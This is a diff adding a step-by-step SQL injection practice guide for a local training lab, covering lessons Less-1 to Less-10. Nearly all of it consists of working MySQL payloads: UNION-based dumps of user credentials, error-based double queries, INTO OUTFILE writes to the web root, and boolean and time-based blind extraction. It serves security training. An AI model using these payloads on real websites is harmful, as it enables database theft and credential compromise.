@@ -1,0 +1,276 @@
+# SQL Injection Practice Guide - Less-1 to Less-10
+# Lab URL: http://localhost:8888
+
+## Less-1: Error Based - String (Basic)
+
+### Objective: Learn basic error-based SQL injection
+
+### Step-by-Step:
+1. **Normal Request**: http://localhost:8888/Less-1/?id=1
+   - Expected: Shows user details for ID 1
+
+2. **Test for Vulnerability**: http://localhost:8888/Less-1/?id=1'
+   - Expected: MySQL error message revealing query structure
+   - Error: "You have an error in your SQL syntax; check the manual..."
+
+3. **Find Number of Columns**: 
+   - Try: http://localhost:8888/Less-1/?id=1' ORDER BY 1 --
+   - Try: http://localhost:8888/Less-1/?id=1' ORDER BY 2 --
+   - Try: http://localhost:8888/Less-1/?id=1' ORDER BY 3 --
+   - Try: http://localhost:8888/Less-1/?id=1' ORDER BY 4 --
+   - Expected: Error on ORDER BY 4, so 3 columns exist
+
+4. **UNION SELECT Attack**:
+   - Try: http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,2,3 --
+   - Expected: Shows numbers 2 and 3 on the page (columns 2 and 3 are displayed)
+
+5. **Extract Database Information**:
+   - Database name: http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,DATABASE(),3 --
+   - Version: http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,VERSION(),3 --
+   - Current user: http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,USER(),3 --
+
+6. **Extract Table Names**:
+   ```
+   http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() --
+   ```
+
+7. **Extract Column Names**:
+   ```
+   http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' --
+   ```
+
+8. **Extract User Data**:
+   ```
+   http://localhost:8888/Less-1/?id=-1' UNION SELECT 1,CONCAT(username,':',password),3 FROM users --
+   ```
+
+---
+
+## Less-2: Error Based - Integer (Basic)
+
+### Objective: Integer-based SQL injection (no quotes needed)
+
+### Step-by-Step:
+1. **Normal Request**: http://localhost:8888/Less-2/?id=1
+2. **Test for Vulnerability**: http://localhost:8888/Less-2/?id=1'
+   - Expected: No error (integer parameter)
+3. **Try without quotes**: http://localhost:8888/Less-2/?id=1 AND 1=2
+   - Expected: No results returned
+4. **UNION Attack**: http://localhost:8888/Less-2/?id=-1 UNION SELECT 1,2,3
+5. **Extract Data**: http://localhost:8888/Less-2/?id=-1 UNION SELECT 1,username,password FROM users
+
+---
+
+## Less-3: Error Based - String (with twist)
+
+### Objective: String-based injection with single quotes and parentheses
+
+### Step-by-Step:
+1. **Test**: http://localhost:8888/Less-3/?id=1'
+   - Expected: Error showing ') near syntax
+2. **Close parentheses**: http://localhost:8888/Less-3/?id=1') --
+3. **UNION Attack**: http://localhost:8888/Less-3/?id=-1') UNION SELECT 1,2,3 --
+4. **Extract Data**: http://localhost:8888/Less-3/?id=-1') UNION SELECT 1,username,password FROM users --
+
+---
+
+## Less-4: Error Based - Double Quotes
+
+### Objective: Double quote string-based injection
+
+### Step-by-Step:
+1. **Test**: http://localhost:8888/Less-4/?id=1'
+   - Expected: Error showing ") near syntax
+2. **Close double quotes**: http://localhost:8888/Less-4/?id=1") --
+3. **UNION Attack**: http://localhost:8888/Less-4/?id=-1") UNION SELECT 1,2,3 --
+4. **Extract Data**: http://localhost:8888/Less-4/?id=-1") UNION SELECT 1,username,password FROM users --
+
+---
+
+## Less-5: Double Injection - Single Quotes
+
+### Objective: Error-based injection using double query technique
+
+### Step-by-Step:
+1. **Test**: http://localhost:8888/Less-5/?id=1'
+   - Expected: Error message
+2. **Double Query Technique**:
+   ```
+   http://localhost:8888/Less-5/?id=1' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) --
+   ```
+3. **Extract Database Name**:
+   ```
+   http://localhost:8888/Less-5/?id=1' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(DATABASE(),FLOOR(RAND(0)*2))) --
+   ```
+4. **Extract Table Names**:
+   ```
+   http://localhost:8888/Less-5/?id=1' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))) --
+   ```
+
+---
+
+## Less-6: Double Injection - Double Quotes
+
+### Objective: Same as Less-5 but with double quotes
+
+### Step-by-Step:
+1. **Test**: http://localhost:8888/Less-6/?id=1"
+2. **Double Query with Double Quotes**:
+   ```
+   http://localhost:8888/Less-6/?id=1" AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) --
+   ```
+3. **Extract Data**: Follow same pattern as Less-5 but use double quotes
+
+---
+
+## Less-7: Dump into File
+
+### Objective: Write query results to a file
+
+### Step-by-Step:
+1. **Test**: http://localhost:8888/Less-7/?id=1'
+2. **Write to File**:
+   ```
+   http://localhost:8888/Less-7/?id=1')) UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/dump.txt' --
+   ```
+3. **Extract Data to File**:
+   ```
+   http://localhost:8888/Less-7/?id=1')) UNION SELECT 1,username,password FROM users INTO OUTFILE '/var/www/html/users.txt' --
+   ```
+4. **Access the file**: http://localhost:8888/users.txt
+
+---
+
+## Less-8: Boolean Based Blind
+
+### Objective: Extract data without error messages
+
+### Step-by-Step:
+1. **Test True Condition**: http://localhost:8888/Less-8/?id=1' AND 1=1 --
+   - Expected: "You are in..........." message
+2. **Test False Condition**: http://localhost:8888/Less-8/?id=1' AND 1=2 --
+   - Expected: No output
+3. **Extract Database Name Length**:
+   ```
+   http://localhost:8888/Less-8/?id=1' AND LENGTH(DATABASE())=8 --
+   ```
+4. **Extract Database Name Character by Character**:
+   ```
+   http://localhost:8888/Less-8/?id=1' AND SUBSTRING(DATABASE(),1,1)='s' --
+   http://localhost:8888/Less-8/?id=1' AND SUBSTRING(DATABASE(),2,1)='e' --
+   ```
+5. **Extract First Table Name**:
+   ```
+   http://localhost:8888/Less-8/?id=1' AND SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1)='u' --
+   ```
+6. **Extract Username**:
+   ```
+   http://localhost:8888/Less-8/?id=1' AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='D' --
+   ```
+
+---
+
+## Less-9: Time Based Blind
+
+### Objective: Extract data using time delays
+
+### Step-by-Step:
+1. **Test Time Delay**: http://localhost:8888/Less-9/?id=1' AND SLEEP(5) --
+   - Expected: 5-second delay
+2. **Conditional Time Delay**:
+   ```
+   http://localhost:8888/Less-9/?id=1' AND IF(1=1,SLEEP(5),0) --
+   ```
+3. **Extract Database Name**:
+   ```
+   http://localhost:8888/Less-9/?id=1' AND IF(SUBSTRING(DATABASE(),1,1)='s',SLEEP(5),0) --
+   ```
+4. **Extract Table Names**:
+   ```
+   http://localhost:8888/Less-9/?id=1' AND IF(SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1)='u',SLEEP(5),0) --
+   ```
+5. **Extract User Data**:
+   ```
+   http://localhost:8888/Less-9/?id=1' AND IF(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='D',SLEEP(5),0) --
+   ```
+
+---
+
+## Less-10: Time Based Blind (Double Quotes)
+
+### Objective: Same as Less-9 but with double quotes
+
+### Step-by-Step:
+1. **Test**: http://localhost:8888/Less-10/?id=1"
+2. **Time Delay with Double Quotes**:
+   ```
+   http://localhost:8888/Less-10/?id=1" AND SLEEP(5) --
+   ```
+3. **Extract Data**: Follow same pattern as Less-9 but use double quotes
+
+---
+
+## Quick Reference for Less-1 to Less-10
+
+| Lesson | Type | Injection Point | Example Payload |
+|--------|------|----------------|-----------------|
+| Less-1 | Error-based | String (') | `' UNION SELECT 1,2,3 --` |
+| Less-2 | Error-based | Integer | `UNION SELECT 1,2,3` |
+| Less-3 | Error-based | String (') + () | `') UNION SELECT 1,2,3 --` |
+| Less-4 | Error-based | String (") + () | `") UNION SELECT 1,2,3 --` |
+| Less-5 | Double Query | String (') | `' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) --` |
+| Less-6 | Double Query | String (") | `" AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) --` |
+| Less-7 | File Write | String (') + () | `')) UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/dump.txt' --` |
+| Less-8 | Boolean Blind | String (') | `' AND 1=1 --` |
+| Less-9 | Time Blind | String (') | `' AND SLEEP(5) --` |
+| Less-10 | Time Blind | String (") | `" AND SLEEP(5) --` |
+
+---
+
+## Common Patterns for Data Extraction
+
+### Get Database Name:
+```sql
+' UNION SELECT 1,DATABASE(),3 --
+```
+
+### Get All Tables:
+```sql
+' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() --
+```
+
+### Get All Columns for 'users' Table:
+```sql
+' UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' --
+```
+
+### Get All Users and Passwords:
+```sql
+' UNION SELECT 1,GROUP_CONCAT(CONCAT(username,':',password)),3 FROM users --
+```
+
+---
+
+## Practice Tips:
+
+1. **Start with Less-1** - It's the most straightforward
+2. **Master UNION SELECT** - Essential for most attacks
+3. **Learn to count columns** - Always start with ORDER BY
+4. **Practice blind techniques** - Less-8 and Less-9 are crucial
+5. **Use Burp Suite** - Great for automating blind attacks
+6. **Document your findings** - Keep track of successful payloads
+
+---
+
+## Expected Results Summary:
+
+- **Less-1**: Full database dump possible via UNION
+- **Less-2**: Same as Less-1 but no quotes needed
+- **Less-3**: Close parentheses before injection
+- **Less-4**: Use double quotes instead of single
+- **Less-5**: Extract data via error messages
+- **Less-6**: Same as Less-5 with double quotes
+- **Less-7**: Write results to accessible files
+- **Less-8**: Extract data based on true/false responses
+- **Less-9**: Extract data based on response time
+- **Less-10**: Same as Less-9 with double quotes
